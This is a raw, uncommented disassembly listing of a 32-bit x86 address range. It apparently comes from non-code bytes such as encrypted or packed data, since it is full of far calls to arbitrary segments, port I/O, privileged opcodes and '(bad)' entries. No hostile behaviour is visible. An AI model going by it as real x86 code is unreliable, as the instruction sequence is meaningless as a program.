  405d8c:	dec    ebx
  405d8d:	ins    BYTE PTR es:[edi],dx
  405d8e:	cmp    BYTE PTR [esi*4-0x7c72530d],bh
  405d95:	stos   DWORD PTR es:[edi],eax
  405d96:	inc    esp
  405d97:	addr16 mov esi,0x5cf6f60a
  405d9d:	or     al,0x33
  405d9f:	inc    ebx
  405da0:	imul   esp,edx,0x24
  405da3:	out    0x89,eax
  405da5:	in     eax,dx
  405da6:	lds    ecx,FWORD PTR [edx+0xb1260bc]
  405dac:	sahf   
  405dad:	or     ebx,DWORD PTR [ebp-0x46965e62]
  405db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405db4:	xor    ebx,edi
  405db6:	sub    al,0x2a
  405db8:	jne    0x405e16
  405dba:	inc    edi
  405dbb:	and    DWORD PTR [edx+0x1a],eax
  405dbe:	call   0x620c:0x70915c8e
  405dc5:	les    esp,FWORD PTR [ecx+0xcd449a7]
  405dcb:	pop    edx
  405dcc:	ret    
  405dcd:	or     edx,edx
  405dcf:	xor    DWORD PTR [edx+0x6ca26b01],0x690f3ac0
  405dd9:	or     edx,esp
  405ddb:	dec    edi
  405ddc:	stc    
  405ddd:	sub    BYTE PTR [eax-0x6a2452c8],0x32
  405de4:	out    0xfc,al
  405de6:	push   edi
  405de7:	pop    es
  405de8:	call   0x250b:0x5dda70b0
  405def:	cmp    DWORD PTR [ecx+esi*1+0x79f762f4],ebx
  405df6:	call   0x301:0x89ccbdc6
  405dfd:	xchg   al,ah
  405dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e00:	ret    0x7390
  405e03:	int3   
  405e04:	add    BYTE PTR [eax],bh
  405e06:	lods   al,BYTE PTR ds:[esi]
  405e07:	push   ebp
  405e08:	mov    dl,0x56
  405e0a:	xchg   ecx,eax
  405e0b:	ds sbb eax,0x4ee8d30e
  405e11:	or     esi,esi
  405e13:	icebp  
  405e14:	xchg   BYTE PTR ds:0xa013ed2d,bl
  405e1a:	call   0x3b25:0x8742d04
  405e21:	push   ecx
  405e22:	mov    cl,0xa7
  405e24:	fwait
  405e25:	es inc edx
  405e27:	aas    
  405e28:	shl    ah,1
  405e2a:	cmp    DWORD PTR [edi-0x20443645],0x35
  405e31:	mov    esi,ebx
  405e33:	xlat   BYTE PTR ds:[ebx]
  405e34:	cmp    al,0x48
  405e36:	shl    BYTE PTR [edi+0x15d55338],0xd1
  405e3d:	adc    edx,DWORD PTR [ebx]
  405e3f:	stos   BYTE PTR es:[edi],al
  405e40:	mov    dl,0x94
  405e42:	fsubr  DWORD PTR [esi+0x10386415]
  405e48:	pop    edx
  405e49:	or     edi,DWORD PTR [esi]
  405e4b:	xor    BYTE PTR [edi+0x6ccd350d],0x22
  405e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e53:	mov    ecx,0x24959fc4
  405e58:	sbb    BYTE PTR ds:0xc0e0b16f,dh
  405e5e:	call   0xb6f9:0x5286025d
  405e65:	or     ebx,ecx
  405e67:	call   0x7f7fe04d
  405e6c:	jnp    0x405eeb
  405e6e:	popf   
  405e6f:	test   DWORD PTR [edx-0x30],0xe892f1aa
  405e76:	dec    edi
  405e77:	mov    cl,0x86
  405e79:	in     eax,0x6d
  405e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e7c:	fsubr  DWORD PTR [esi+0x37]
  405e7f:	jbe    0x405e74
  405e81:	mov    esp,0x8fb2287f
  405e86:	xchg   edi,eax
  405e87:	ins    DWORD PTR es:[edi],dx
  405e88:	sahf   
  405e89:	dec    ebp
  405e8a:	sbb    al,0x61
  405e8c:	mov    DWORD PTR [edi-0xb],esi
  405e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e90:	into   
  405e91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e92:	push   0x327049f7
  405e97:	inc    ebx
  405e98:	mov    ah,0x4e
  405e9a:	xchg   BYTE PTR [edx+eiz*4-0x5982a37],al
  405ea1:	jmp    0x405f01
  405ea3:	and    esi,esp
  405ea5:	scas   eax,DWORD PTR es:[edi]
  405ea6:	iret   
  405ea7:	mov    edx,0x5b816ee1
  405eac:	mov    bl,0xde
  405eae:	mov    al,ds:0x601e23b3
  405eb3:	pop    ebx
  405eb4:	jl     0x405f0a
  405eb6:	xchg   ecx,eax
  405eb7:	xor    ebx,0xffffffcc
  405eba:	(bad)  
  405ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ebc:	dec    esi
  405ebd:	jl     0x405e6c
  405ebf:	jo     0x405e63
  405ec1:	or     bh,BYTE PTR [esp+ebp*2-0x51b1c405]
  405ec8:	arpl   bx,sp
  405eca:	or     bl,ch
  405ecc:	scas   eax,DWORD PTR es:[edi]
  405ecd:	call   0x7bbd77f4
  405ed2:	inc    ebp
  405ed3:	mov    ch,BYTE PTR [bp+0x5]
  405ed8:	sbb    al,0xb
  405eda:	cmp    al,0x97
  405edc:	stos   BYTE PTR es:[edi],al
  405edd:	pusha  
  405ede:	loop   0x405ef5
  405ee0:	iret   
  405ee1:	sbb    BYTE PTR [eax-0x6f937cc6],0xd2
  405ee8:	loopne 0x405eb5
  405eea:	pop    ebp
  405eeb:	or     dl,BYTE PTR [ebp+eax*1+0x5e30e64]
  405ef2:	cli    
  405ef3:	jge    0x405edd
  405ef5:	shl    BYTE PTR [ebp-0x4b7d4a9e],cl
  405efb:	or     al,0xce
  405efd:	pop    esp
  405efe:	push   0x51
  405f00:	cmp    BYTE PTR [eax+0x2],bh
  405f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f04:	cs and bl,ah
  405f07:	push   esp
  405f08:	aam    0x13
  405f0a:	outs   dx,DWORD PTR ds:[esi]
  405f0b:	pop    eax
  405f0c:	mov    dl,0x8f
  405f0e:	(bad)
  405f12:	xchg   ecx,eax
  405f13:	add    al,0xc9
  405f15:	or     esp,edx
  405f17:	push   esi
  405f18:	push   eax
  405f19:	and    dh,BYTE PTR [eax+0x9]
  405f1c:	jno    0x405f45
  405f1e:	call   0x3301:0x29858910
  405f25:	inc    edi
  405f26:	push   ebp
  405f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f28:	rol    BYTE PTR [esi],0x76
  405f2b:	xchg   ebp,eax
  405f2c:	repz push 0x2c
  405f2f:	shl    DWORD PTR [edx-0x6953d806],cl
  405f35:	js     0x405eef
  405f37:	(bad)  
  405f38:	std    
  405f39:	push   cs
  405f3a:	sbb    eax,0x3ae3ba73
  405f3f:	test   al,0x1a
  405f41:	cmp    DWORD PTR [edx-0xc898e3c],0xffffffbd
  405f48:	mov    bl,0x3f
  405f4a:	(bad)  
  405f4b:	or     eax,0x28b6f57
  405f50:	jle    0x405f16
  405f52:	fbld   TBYTE PTR [edi-0x9a8b045]
  405f58:	xchg   edx,eax
  405f59:	or     ch,bh
  405f5b:	mov    cl,ch
  405f5d:	dec    ebp
  405f5e:	call   0x18d5:0x4b749ab
  405f65:	sub    al,0xc9
  405f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f68:	jl     0x405fb1
  405f6a:	enter  0xdc09,0x7f
  405f6e:	inc    eax
  405f6f:	cmp    al,0xb2
  405f71:	add    DWORD PTR [eax-0x17644c64],esi
  405f77:	push   ds
  405f78:	and    ecx,DWORD PTR [ebx]
  405f7a:	sbb    esp,DWORD PTR [ebx-0x49]
  405f7d:	sbb    DWORD PTR [esi],eax
  405f7f:	jns    0x405f79
  405f81:	push   edi
  405f82:	call   0x5fbb:0x79164d16
  405f89:	mov    al,0x27
  405f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8c:	push   edi
  405f8d:	cli    
  405f8e:	cmp    eax,0x5d4248c3
  405f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f94:	mov    dl,0x3c
  405f96:	or     DWORD PTR [ebp+0x5e0558f6],edi
  405f9c:	fisttp WORD PTR [ecx]
  405f9e:	stos   DWORD PTR es:[edi],eax
  405f9f:	sbb    eax,0x5a7e5ee0
  405fa4:	push   ecx
  405fa5:	xlat   BYTE PTR ds:[ebx]
  405fa6:	adc    ch,BYTE PTR ds:0x82856b8b
  405fac:	mov    eax,ds:0xd4a9da96
  405fb1:	mov    bl,0xa7
  405fb3:	ins    BYTE PTR es:[edi],dx
  405fb4:	lods   al,BYTE PTR ds:[esi]
  405fb5:	or     ebx,esi
  405fb7:	lahf   
  405fb8:	xchg   ah,bh
  405fba:	push   ebx
  405fbb:	mov    ds:0x2a78e56f,al
  405fc0:	push   ecx
  405fc1:	neg    DWORD PTR [edi-0x4f]
  405fc4:	inc    edx
  405fc5:	lods   eax,DWORD PTR ds:[esi]
  405fc6:	fs jnp 0x405f7a
  405fc9:	jbe    0x40602e
  405fcb:	out    0x62,al
  405fcd:	popf   
  405fce:	loopne 0x40602f
  405fd0:	nop
  405fd1:	daa    
  405fd2:	xchg   edx,eax
  405fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fd4:	rcl    BYTE PTR [eax],1
  405fd6:	xor    DWORD PTR [ebp+0x75],edi
  405fd9:	inc    ebp
  405fda:	pop    esp
  405fdb:	cmp    BYTE PTR [edx-0x3c],bl
  405fde:	call   0x3090:0xe26e62f3
  405fe5:	dec    edx
  405fe6:	sbb    al,0x9e
  405fe8:	sbb    DWORD PTR [edx+ebx*1-0x5688e77e],esi
  405fef:	dec    eax
  405ff0:	cwde   
  405ff1:	jb     0x405f8d
  405ff3:	ins    DWORD PTR es:[edi],dx
  405ff4:	fdivrp st(7),st
  405ff6:	fwait
  405ff7:	rcr    BYTE PTR [ebx+eiz*4-0x67],1
  405ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ffc:	(bad)  
  405ffd:	rol    esi,1
  405fff:	cmp    BYTE PTR ds:0xb25e9d6b,al
  406005:	in     al,0xe8
  406007:	cwde   
  406008:	cmp    BYTE PTR [eax],bl
  40600a:	dec    eax
  40600b:	outs   dx,BYTE PTR ds:[esi]
  40600c:	js     0x406079
  40600e:	push   esi
  40600f:	inc    ebp
  406010:	sub    BYTE PTR [ecx-0x4949e2fb],ah
  406016:	sahf   
  406017:	sub    ch,cl
  406019:	ja     0x406074
  40601b:	test   ah,ch
  40601d:	xor    DWORD PTR [esi-0x43],0xffffff83
  406021:	or     edx,DWORD PTR [edx+0x24d80929]
  406027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406028:	clc    
  406029:	adc    al,0x9b
  40602b:	retf   
  40602c:	sub    al,0xbf
  40602e:	dec    bp
  406030:	push   eax
  406031:	int    0x72
  406033:	xor    ebx,DWORD PTR [eax+ecx*1-0x74]
  406037:	push   eax
  406038:	pop    ecx
  406039:	rol    DWORD PTR [ebx+0x1bc902e0],cl
  40603f:	ror    DWORD PTR [esi-0x6dd907cb],0x90
  406046:	test   dh,0x3f
  406049:	sub    dl,BYTE PTR [ebx-0xa]
  40604c:	xor    bl,BYTE PTR [ebx+0x0]
  40604f:	or     al,0x41
  406051:	xor    al,0xbf
  406053:	sbb    BYTE PTR [edx+0x17594e1b],dh
  406059:	dec    esi
  40605a:	mov    cl,0x4f
  40605c:	xor    cl,BYTE PTR [ebx]
  40605e:	outs   dx,BYTE PTR ds:[esi]
  40605f:	int    0xe3
  406061:	fcom   DWORD PTR [edx-0x54]
  406064:	out    dx,eax
  406065:	jle    0x406001
  406067:	adc    BYTE PTR [edi+eax*4],0xf7
  40606b:	push   ss
  40606c:	popf   
  40606d:	mov    eax,0x3483a7c2
  406072:	fldenv [esi]
  406074:	inc    ecx
  406075:	jb     0x40607c
  406077:	out    0xb2,eax
  406079:	dec    esp
  40607a:	sub    BYTE PTR [esi+0x50],cl
  40607d:	outs   dx,BYTE PTR ds:[esi]
  40607e:	mov    bl,0xb1
  406080:	mov    eax,0x74413c0c
  406085:	cmc    
  406086:	loop   0x40605f
  406088:	push   edx
  406089:	inc    edi
  40608a:	xchg   DWORD PTR [ebx],edi
  40608c:	scas   al,BYTE PTR es:[edi]
  40608d:	rcr    BYTE PTR [eax-0x718cdf5],0x2c
  406094:	and    esi,edi
  406096:	ins    BYTE PTR es:[edi],dx
  406097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406098:	xchg   ebx,eax
  406099:	mov    al,ds:0xade7055f
  40609e:	add    ch,BYTE PTR [eax-0x443c1f4e]
  4060a4:	(bad)  
  4060a5:	mov    esi,0xb0645b3
  4060aa:	mov    ecx,0xdb7f1618
  4060af:	mov    esi,0xd19a9bd4
  4060b4:	popa   
  4060b5:	sbb    eax,0xf5f0100d
  4060ba:	mov    ch,0xa7
  4060bc:	lds    edi,FWORD PTR [edi]
  4060be:	adc    BYTE PTR [esi],bh
  4060c0:	jno    0x40611b
  4060c2:	(bad)  
  4060c3:	iret   
  4060c4:	mov    dl,0xe5
  4060c6:	dec    edi
  4060c7:	lods   al,BYTE PTR ds:[esi]
  4060c8:	clc    
  4060c9:	imul   eax,ebp,0xfffffffc
  4060cc:	cmp    al,0x8
  4060ce:	xor    BYTE PTR [ebx+0x3f663c33],ch
  4060d4:	cmp    bl,BYTE PTR [eax-0x43]
  4060d7:	and    eax,0x243cb5b2
  4060dc:	mov    bl,BYTE PTR [ebx+0x25]
  4060df:	scas   eax,DWORD PTR es:[edi]
  4060e0:	inc    esp
  4060e1:	or     eax,DWORD PTR [ebp-0x36]
  4060e4:	push   esi
  4060e5:	xchg   esp,eax
  4060e6:	xlat   BYTE PTR ds:[ebx]
  4060e7:	push   cs
  4060e8:	out    0x28,al
  4060ea:	call   0x204c:0x6f8ef3df
  4060f1:	(bad)  
  4060f2:	aas    
  4060f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060f4:	rol    ch,0x7e
  4060f7:	push   esp
  4060f8:	inc    ebx
  4060f9:	push   0xffffffe1
  4060fb:	fdiv   DWORD PTR [edx+0x5333a455]
  406101:	fisubr DWORD PTR [edx]
  406103:	stos   DWORD PTR es:[edi],eax
  406104:	pop    eax
  406105:	or     ecx,DWORD PTR [ebx+0x7f4ffe8c]
  40610b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40610c:	adc    DWORD PTR [edx-0x60],esi
  40610f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406110:	jge    0x40611d
  406112:	out    dx,eax
  406113:	xor    eax,0x25227daa
  406118:	ret    
  406119:	or     esi,DWORD PTR [edi-0x77]
  40611c:	jp     0x4060a8
  40611e:	xchg   esp,eax
  40611f:	or     esi,esi
  406121:	neg    DWORD PTR [edx+0x45abe1a0]
  406127:	jns    0x4060b8
  406129:	cmp    ebx,ebx
  40612b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40612c:	(bad)  
  40612d:	mov    DWORD PTR [eax-0x3b],ecx
  406130:	scas   al,BYTE PTR es:[edi]
  406131:	sbb    al,0x80
  406133:	out    0xc0,eax
  406135:	pushf  
  406136:	mov    fs,WORD PTR [esi-0x1b]
  406139:	cmp    al,0x10
  40613b:	popf   
  40613c:	dec    esp
  40613d:	or     eax,DWORD PTR [edx+0x5affb494]
  406143:	gs aas 
  406145:	push   cs
  406146:	sbb    BYTE PTR [esi],al
  406148:	test   esi,0x4d1679f
  40614e:	es push eax
  406150:	mov    bh,0x90
  406152:	jb     0x406155
  406154:	pusha  
  406155:	mov    edx,0xcceb4c5a
  40615a:	lea    esp,[edi-0x3bc67d41]
  406160:	inc    ecx
  406161:	test   BYTE PTR [ecx-0x20],0xb0
  406165:	add    eax,0xd1b83f28
  40616a:	pushf  
  40616b:	inc    esp
  40616c:	loop   0x4060f1
  40616e:	xor    al,0x1b
  406170:	adc    ecx,DWORD PTR [ebx]
  406172:	inc    esp
  406173:	sub    BYTE PTR [eax+ecx*2+0xa],dl
  406177:	and    eax,0xc49a7955
  40617c:	xchg   ebx,eax
  40617d:	adc    ah,al
  40617f:	jge    0x4061f5
  406181:	retf   
  406182:	xor    BYTE PTR [edi-0x3a0dd9b8],ah
  406188:	js     0x40610b
  40618a:	shr    DWORD PTR [ebp+esi*4-0x1ff6b5cf],0x7a
  406192:	jmp    0x4061de
  406194:	fild   WORD PTR [edi]
  406196:	mov    edx,0x460cc95a
  40619b:	out    0x63,al
  40619d:	div    al
  40619f:	out    0xeb,eax
  4061a1:	xchg   DWORD PTR [ebx+0x73],ebp
  4061a4:	mov    cl,0xb8
  4061a6:	and    BYTE PTR [ebx+0x5c156eea],ch
  4061ac:	pop    ecx
  4061ad:	repz fiadd DWORD PTR [edx]
  4061b0:	sbb    BYTE PTR [ebx],cl
  4061b2:	data16 jno 0x40620a
  4061b5:	inc    edx
  4061b6:	jbe    0x4061a7
  4061b8:	mov    cl,0x5d
  4061ba:	call   0x4765:0xdf9f47f
  4061c1:	jg     0x4061ee
  4061c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061c4:	push   ss
  4061c5:	mov    al,0xbb
  4061c7:	out    dx,al
  4061c8:	and    DWORD PTR [eax+0x0],ecx
  4061cb:	bound  edx,QWORD PTR [esi-0x69ffd315]
  4061d1:	out    0x9a,eax
  4061d3:	dec    ecx
  4061d4:	jns    0x4061a2
  4061d6:	pushf  
  4061d7:	mov    cl,bh
  4061d9:	or     esp,DWORD PTR [ebx+0x5c7c7e00]
  4061df:	mov    edi,0x669a1b63
  4061e4:	test   BYTE PTR [edi+0x4119552],cl
  4061ea:	outs   dx,BYTE PTR ds:[esi]
  4061eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ec:	fistp  WORD PTR [ecx+0x2f]
  4061ef:	xor    edi,esi
  4061f1:	out    dx,al
  4061f2:	inc    esi
  4061f3:	loopne 0x4061a7
  4061f5:	sahf   
  4061f6:	mov    edx,0x25ad1de1
  4061fb:	into   
  4061fc:	and    eax,0xae69ec09
  406201:	int    0x84
  406203:	pop    ebp
  406204:	repnz mov fs,WORD PTR [eax]
  406207:	and    BYTE PTR [ebx-0x49156817],dh
  40620d:	inc    eax
  40620e:	dec    esi
  40620f:	pop    DWORD PTR [edx+0x68]
  406212:	sti    
  406213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406214:	jmp    0xfaf2:0x82944f19
  40621b:	mov    ah,0xb2
  40621d:	shl    BYTE PTR [eax],cl
  40621f:	das    
  406220:	icebp  
  406221:	stos   BYTE PTR es:[edi],al
  406222:	xor    ebx,DWORD PTR [esi+eiz*8+0xf]
  406226:	jmp    0x301bc61a
  40622b:	pusha  
  40622c:	mov    al,0x2c
  40622e:	and    edx,DWORD PTR [edi+0x37]
  406231:	data16 add al,0x8f
  406234:	mov    bl,0x87
  406236:	mov    ebp,0x10e1c1a
  40623b:	mov    ebx,0xa7a09856
  406240:	mov    dh,BYTE PTR [ebx-0x3]
  406243:	fldenv [eax-0x4dbc202b]
  406249:	icebp  
  40624a:	test   DWORD PTR [ebp-0x2f],esi
  40624d:	mov    ?,WORD PTR [esp+ebp*2+0x2b]
  406251:	xor    cl,bl
  406253:	shl    BYTE PTR [edx],cl
  406255:	mov    ds:0xde82c9c2,eax
  40625a:	inc    esp
  40625b:	xor    eax,0xf27ea6b2
  406260:	xor    bh,BYTE PTR [ebx-0x5d]
  406263:	sbb    BYTE PTR [ebx+0xa],cl
  406266:	icebp  
  406267:	(bad)
  40626a:	mov    DWORD PTR [edx-0x17],edi
  40626d:	sub    edi,DWORD PTR [esi]
  40626f:	or     al,0xb2
  406271:	push   ebp
  406272:	pop    ecx
  406273:	sub    ch,BYTE PTR [edx-0x61d850a1]
  406279:	add    dh,BYTE PTR [edx]
  40627b:	xchg   ecx,eax
  40627c:	mov    esi,0x6fac1a68
  406281:	cmp    edx,DWORD PTR [edx-0x20ee53d2]
  406287:	fidiv  DWORD PTR [edx+0xc]
  40628a:	xor    DWORD PTR [ebx+0x31],esi
  40628d:	pop    eax
  40628e:	cld    
  40628f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406290:	repz fld DWORD PTR [ecx]
  406293:	stos   BYTE PTR es:[edi],al
  406294:	add    DWORD PTR [edi+0x369c8909],ecx
  40629a:	scas   eax,DWORD PTR es:[edi]
  40629b:	scas   al,BYTE PTR es:[edi]
  40629c:	mov    dl,0x53
  40629e:	pushf  
  40629f:	cmp    ebp,DWORD PTR ss:[ecx]
  4062a2:	sbb    al,0xa7
  4062a4:	jge    0x406236
  4062a6:	js     0x4062b6
  4062a8:	mov    cl,0xe
  4062aa:	clc    
  4062ab:	fs mov dl,0xcd
  4062ae:	or     al,0xed
  4062b0:	sub    BYTE PTR [eax-0x4e],al
  4062b3:	add    eax,0xc440b04
  4062b8:	pop    esi
  4062b9:	loop   0x406245
  4062bb:	mov    ebp,0xf29a1002
  4062c0:	adc    eax,DWORD PTR [edi+ebp*4-0x7473d53c]
  4062c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062c8:	jmp    0x4062ba
  4062ca:	push   es
  4062cb:	push   ds
  4062cc:	inc    esi
  4062cd:	stc    
  4062ce:	and    BYTE PTR [esi+0x157372b6],al
  4062d4:	mul    DWORD PTR [ecx-0x1fd35da6]
  4062da:	aad    0xa7
  4062dc:	fild   DWORD PTR [edi-0x16e84bfa]
  4062e2:	inc    ecx
  4062e3:	int3   
  4062e4:	mov    dl,0xeb
  4062e6:	xchg   eax,edx
  4062e8:	or     bh,BYTE PTR [ecx]
  4062ea:	jmp    0x4062f0
  4062ec:	cmp    cl,BYTE PTR [ebx]
  4062ee:	daa    
  4062ef:	xchg   eax,edi
  4062f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062f2:	xchg   edx,eax
  4062f3:	leave  
  4062f4:	dec    DWORD PTR [esi-0x331ebd66]
  4062fa:	xchg   ecx,eax
  4062fb:	mov    fs,edi
  4062fd:	xor    ch,BYTE PTR [eax+ebp*4]
  406300:	cs dec esi
  406302:	shr    DWORD PTR [ebx-0x4aacf4e0],1
  406308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406309:	(bad)  [ebx]
  40630b:	sbb    BYTE PTR [ebp-0x300340f],dh
  406311:	xchg   ebx,eax
  406312:	dec    ebp
  406313:	(bad)  
  406314:	bnd jbe 0x406301
  406317:	jns    0x4062af
  406319:	or     eax,DWORD PTR [edi]
  40631b:	and    DWORD PTR [ecx+0x61],eax
  40631e:	mov    edi,0xa4d2fb94
  406323:	jmp    FWORD PTR [esi+0xb]
  406326:	and    BYTE PTR [ecx],bl
  406328:	push   0xffffffaf
  40632a:	add    DWORD PTR [ebx],ecx
  40632c:	jno    0x406339
  40632e:	in     al,0x4a
  406330:	mov    ch,0x2a
  406332:	not    BYTE PTR ds:0x1176cd44
  406338:	add    dh,BYTE PTR [edi-0x66]
  40633b:	leave  
  40633c:	sbb    eax,0xaa9fab76
  406341:	jmp    0x5029:0xb3b4d47
  406348:	dec    ecx
  406349:	(bad)  
  40634b:	lds    ebp,FWORD PTR [eax+eiz*4]
  40634e:	xchg   DWORD PTR [esi-0x6f],esp
  406351:	std    
  406352:	call   0xd44f:0xcbb1280b
  406359:	or     ecx,DWORD PTR [edi]
  40635b:	dec    ecx
  40635c:	lds    ebx,FWORD PTR [ebp+0x7be2dbc5]
  406362:	(bad)  
  406363:	enter  0xb31,0xb2
  406367:	mov    eax,0x1cf6ea97
  40636c:	pop    esp
  40636d:	imul   esi,DWORD PTR ds:0x49de18a3,0xfffffff9
  406374:	mov    dl,0xa8
  406376:	push   es
  406377:	lock add eax,ebp
  40637a:	icebp  
  40637b:	xlat   BYTE PTR ds:[ebx]
  40637c:	pusha  
  40637d:	add    eax,0x85ad56a2
  406382:	cmp    cl,BYTE PTR ds:0x3a1d05d7
  406388:	sub    al,bl
  40638a:	loope  0x4063e7
  40638c:	mov    dl,0xd1
  40638e:	inc    edi
  40638f:	div    DWORD PTR [eax-0x2d]
  406392:	push   es
  406393:	push   esi
  406394:	or     BYTE PTR [ebx],0xa3
  406397:	loopne 0x406377
  406399:	cld    
  40639a:	push   eax
  40639b:	lea    esi,[ebp-0x438864c0]
  4063a1:	out    0xf3,al
  4063a3:	jne    0x406373
  4063a5:	(bad)
  4063a8:	inc    ecx
  4063a9:	or     ecx,DWORD PTR [edi+esi*8-0x39f7bc8f]
  4063b0:	es mov dl,0x9d
  4063b3:	fnstenv [ecx]
  4063b5:	sar    DWORD PTR [edi+0x769d7093],0x47
  4063bc:	cmc    
  4063bd:	mov    dh,0x82
  4063bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c0:	adc    eax,0x797e041d
  4063c5:	(bad)  
  4063c6:	xor    cl,BYTE PTR [ecx-0x6c]
  4063c9:	jmp    FWORD PTR [ebp+0x36]
  4063cc:	mov    dl,0x96
  4063ce:	adc    DWORD PTR [eax-0x5843399b],ebp
  4063d4:	pop    eax
  4063d5:	ins    BYTE PTR es:[edi],dx
  4063d6:	mov    eax,0x89f4b57c
  4063db:	iret   
  4063dc:	mov    esp,0x48e5875e
  4063e1:	mov    BYTE PTR [ecx+esi*4-0x42b51c5e],al
  4063e8:	iret   
  4063e9:	adc    eax,0xb16edeb
  4063ee:	mov    ebp,0xa9839106
  4063f3:	xchg   esi,eax
  4063f4:	inc    eax
  4063f5:	add    eax,0x3168c59a
  4063fa:	out    dx,eax
  4063fb:	stos   DWORD PTR es:[edi],eax
  4063fc:	lods   eax,DWORD PTR ds:[esi]
  4063fd:	paddq  mm7,QWORD PTR [edi]
  406400:	fsubr  QWORD PTR [ebx+0xb5cc8fb]
  406406:	int    0x37
  406408:	sub    ch,al
  40640a:	or     eax,0xa38f7957
  40640f:	pop    ebx
  406410:	arpl   WORD PTR [ebx+0x7ae633de],cx
  406416:	and    eax,DWORD PTR [ebx+0x6476e2de]
  40641c:	ja     0x406429
  40641e:	or     DWORD PTR [ebx+0x24],esi
  406421:	icebp  
  406422:	dec    ecx
  406423:	inc    ecx
  406424:	ins    BYTE PTR es:[edi],dx
  406425:	out    dx,al
  406426:	out    dx,al
  406427:	mov    ?,WORD PTR [edx-0x452dac53]
  40642d:	jmp    0x406414
  40642f:	jmp    0x40649e
  406431:	or     edx,DWORD PTR [edi+0xf175d68]
  406437:	or     ch,bh
  406439:	ds popf 
  40643b:	ins    BYTE PTR es:[edi],dx
  40643c:	enter  0x303d,0x5
  406440:	loope  0x406494
  406442:	sbb    dh,BYTE PTR [edi+0x54]
  406445:	pop    es
  406446:	push   esp
  406447:	mov    al,0x6f
  406449:	jp     0x4064b5
  40644b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644c:	or     edx,DWORD PTR [edx+0x47644776]
  406452:	mov    ds:0xef0be361,al
  406457:	xor    eax,DWORD PTR [ebx]
  406459:	xchg   edi,eax
  40645a:	in     eax,0x77
  40645c:	imul   ecx,ebx,0xffffffe6
  40645f:	maskmovq mm6,(bad)
  406460:	div    DWORD PTR [ebx-0x124cc1e4]
  406466:	adc    ebx,DWORD PTR [ecx]
  406468:	push   eax
  406469:	daa    
  40646a:	dec    edi
  40646b:	and    edx,DWORD PTR [ecx-0x30]
  40646e:	jns    0x4064d7
  406470:	add    ebx,DWORD PTR [edx+0x2]
  406473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406474:	jl     0x40640d
  406476:	mov    BYTE PTR [ebp-0x74],ah
  406479:	lock adc dl,BYTE PTR [edx-0x26f52f4e]
  406480:	mov    eax,DWORD PTR [edx-0x4a]
  406483:	fwait
  406484:	gs sbb eax,0xb8fe1bb
  40648a:	out    0xc2,al
  40648c:	ror    DWORD PTR [edx+0x29b2ccdd],1
  406492:	jmp    0x21f4:0xd80b
  406498:	lds    esi,FWORD PTR [edi+eiz*4]
  40649b:	sbb    al,0x7a
  40649d:	int3   
  40649e:	call   0x3254:0x2c4d39aa
  4064a5:	int3   
  4064a6:	in     eax,0xf1
  4064a8:	mov    BYTE PTR [esi+edi*1],al
  4064ab:	and    al,0x61
  4064ad:	bound  ebx,QWORD PTR [edi-0x68]
  4064b0:	mov    esi,0x2eb9569b
  4064b5:	or     ebx,DWORD PTR [esi]
  4064b7:	xor    al,ah
  4064b9:	cmp    bl,cl
  4064bb:	fdivr  DWORD PTR [edx-0x702c65d9]
  4064c1:	imul   ecx,DWORD PTR ds:0x62beb0e1,0x1f
  4064c8:	test   DWORD PTR [ebx],ecx
  4064ca:	jae    0x4064fe
  4064cc:	jnp    0x4064bf
  4064ce:	pushf  
  4064cf:	jle    0x406484
  4064d1:	mov    al,ds:0xcaad7364
  4064d6:	and    eax,0x86c172d8
  4064db:	dec    esi
  4064dc:	xchg   esp,eax
  4064dd:	jg     0x406464
  4064df:	sti    
  4064e0:	mov    ds:0xf57c9a62,al
  4064e5:	mov    ds:0xd89ceaa2,eax
  4064ea:	xchg   esp,eax
  4064eb:	pop    ebx
  4064ec:	fld    DWORD PTR ds:[edx-0x5ed9e2dc]
  4064f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064f4:	inc    edx
  4064f5:	repnz stos BYTE PTR es:[edi],al
  4064f7:	cli    
  4064f8:	fld    DWORD PTR [ecx]
  4064fa:	popf   
  4064fb:	xor    esp,eax
  4064fd:	mov    ds,WORD PTR [edx-0x13349139]
  406503:	adc    BYTE PTR [edi-0x645834fa],dl
  406509:	int3   
  40650a:	dec    esi
  40650b:	sbb    al,0x55
  40650d:	mov    ds:0xdbb21d96,al
  406512:	jae    0x40649d
  406514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406515:	jbe    0x406536
  406517:	push   ds
  406518:	mov    ds:0x326d270b,al
  40651d:	mov    al,ds:0x642520d7
